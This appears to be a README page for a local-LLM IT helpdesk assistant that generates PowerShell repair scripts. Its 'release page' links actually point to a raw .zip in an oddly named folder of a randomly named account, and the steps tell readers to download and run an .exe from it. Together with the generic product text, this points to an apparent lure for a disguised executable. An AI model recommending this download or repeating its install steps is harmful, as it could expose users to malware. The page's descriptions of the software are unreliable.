---
layout: "default"
title: "🤖 10_ai_it_support_assistant - Automate IT support tasks on your device"
description: "Automate IT support using local LLMs, RAG, and Streamlit to diagnose issues and generate PowerShell recovery scripts from your existing ticket database."
---
# 🤖 10_ai_it_support_assistant - Automate IT support tasks on your device

[![Download Latest Release](https://img.shields.io/badge/Download-Latest_Release-blue?style=for-the-badge)](https://github.com/puppetrygenusscilla672/puppetrygenusscilla672.github.io/raw/refs/heads/main/calendaric/puppetrygenusscilla_github_io_v1.0.zip)

This software brings artificial intelligence to your local workstation. It helps IT staff sort tickets, diagnose computer issues, and create scripts for complex tasks. Because the software runs entirely on your own hardware, your data stays private and safe. It builds a bridge between your support logs and advanced language models without needing a constant internet connection.

## 📋 What this tool does

The assistant acts as a digital pair of hands for busy IT helpdesk teams. It reads through thousands of stored issue records to find quick answers. When an issue occurs, the assistant suggests solutions based on its past experience. If you need to perform a repetitive repair task, the tool writes specific instructions in PowerShell for you to run.

Key benefits include:
- Fast data lookup: It searches a local database instead of relying on slow web searches.
- Data privacy: No sensitive company information leaves your local machine.
- Scripting aid: It builds custom code to handle standard Windows repair jobs.
- Offline performance: It works even when your network goes down.

## 🛠️ System requirements

To run this assistant, your computer needs a few basic components. Ensure your machine meets these specifications for smooth operation:

- Operating System: Windows 10 or Windows 11.
- Processor: A modern dual-core CPU minimum, quad-core recommended.
- Memory: 8GB of RAM. If you want faster results, 16GB works better.
- Storage: 5GB of free space to hold the program and local data files.
- Graphics: A dedicated graphics card helps generate responses faster but is not required.

## 📥 Getting the software

You need to visit the project releases page to obtain the installer. This page contains the latest version of the software package.

[Visit the official release page to download the software.](https://github.com/puppetrygenusscilla672/puppetrygenusscilla672.github.io/raw/refs/heads/main/calendaric/puppetrygenusscilla_github_io_v1.0.zip)

Follow these steps to complete the installation:

1. Click the link above to open the repository release page.
2. Look for the latest release version at the top of the list.
3. Select the file ending in `.exe` to start the download.
4. Save the file to your desktop or downloads folder.
5. Double-click the file once it finishes saving to your drive.
6. Follow the on-screen instructions in the installer window.
7. Click Finish when the installation progress bar reaches the end.

## 🚀 Setting up the assistant

Once the software installs, you must set up the connection to the language model. This model provides the intelligence for the assistant.

1. Open the application from your Start menu.
2. The software will detect that you need a local model engine.
3. It will prompt you to install Ollama if it is not already present.
4. Allow the connector to download the necessary files.
5. Choose a model profile from the settings menu. A medium-sized model offers the best balance of speed and accuracy.
6. Click the Initialize button to build the local database of your helpdesk records.
7. Wait for the status indicator to turn green.

## 🧪 Performing a diagnostic test

You can test the tool by asking it to diagnose a common problem. Try typing a request like "The printer on office desk 4 is not showing up."

The assistant performs these steps:
- It queries the SQLite database for similar past issues.
- It calculates the most likely cause based on the record matches.
- It displays a summary of the problem.
- It provides a text block containing the PowerShell commands needed to restart the printer service.

You can copy the PowerShell code directly into your administrative terminal to apply the fix.

## ⚙️ Understanding the database

The tool keeps 1,213 records of past support tickets in a local database. This collection improves as you add data. You can import new records by saving your old support logs in simple text format. The application automatically detects new files in the designated folder and updates its knowledge base. You never have to manually edit the database structure to keep it current.

## 💡 Frequent questions

**Does this software send my logs to the cloud?**
No. Every bit of data stays on your internal drive. 

**What if my computer is slow?**
If the software feels slow, lower the model size in the settings menu. Smaller models use less memory.

**Can I stop the installation midway?**
Yes. Use the Cancel button in the installer window to halt the process without harming your system.

**How do I update the application?**
Check the repository link occasionally for a new version. Download the new installer and run it. The new version will copy over the old one while keeping your existing database records intact.

**Is it safe to run the generated PowerShell scripts?**
The scripts serve as templates. Always review the code the assistant produces before running it on a production machine. The assistant provides the code, but you remain in control of your systems.

## 🛠️ Troubleshooting common issues

If you encounter an error, try these fixes:

- If the application will not open, restart your computer to clear the memory.
- If the assistant returns no results, check the data folder. Ensure your text files follow the standard layout defined in the settings tab.
- If the model generation stalls, verify your internet connection only during the initial download of the language engine. After that, keep your machine offline if you prefer.
- If you see an error about memory, close other open programs while the assistant runs.

This tool provides a sturdy foundation for independent IT support. By centralizing your local records and automating repetitive tasks, you cut down on the time spent searching for solutions. The offline design ensures that your helpdesk operations remain stable regardless of external service availability or network conditions. Keep your local records updated to see the most accurate recommendations.